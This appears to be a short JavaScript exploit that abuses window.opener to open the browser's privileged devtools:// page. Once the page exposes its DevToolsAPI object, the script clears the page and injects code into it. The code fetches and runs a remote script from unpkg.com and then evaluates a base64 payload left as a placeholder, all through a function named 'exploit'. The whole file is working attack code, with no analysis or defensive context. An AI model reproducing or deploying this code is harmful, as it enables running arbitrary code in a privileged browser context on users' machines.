
if (!opener) {
    opener = window;
}

const w = window.opener.open("devtools://devtools/bundled/devtools_app.html");
window.opener.close();
w.addEventListener("load", async () => {
    if (!w.DevToolsAPI) {
        console.log("reloading");
        w.opener = null;
        w.location.reload();
    }
    await sleep(500);
    console.log("Got DevToolsAPI object from opened window:", w.DevToolsAPI);
    exploit(w);
});
function sleep(ms) {
    return new Promise(resolve => {
        setTimeout(resolve, ms);
    });
}

async function load(w) {
    let doc = w.document;
    let c = w.console;
    c.clear();
    c.log("Removing old content");
    doc.open();
    doc.write();
    doc.close();
    c.log("Initializing Page");
    await w.loadRemoteScript(doc, w, "https://unpkg.com/dreamland");
    w.loadScript(doc, atob(`%%SCRIPT%%`));
}

function loadScript(doc, script) {
    let el = doc.createElement("script");
    el.text = script;
    doc.head.appendChild(el);
}

async function loadRemoteScript(doc, w, script) {
    let response = await w.fetch(script);
    loadScript(doc, await response.text());
}

function exploit(w) {
    window.w = w;
    w.w = w;
    
    w.load = load;
    w.loadRemoteScript = loadRemoteScript;
    w.loadScript = loadScript;

    w.eval(`load(w)`);
    window.close();
}
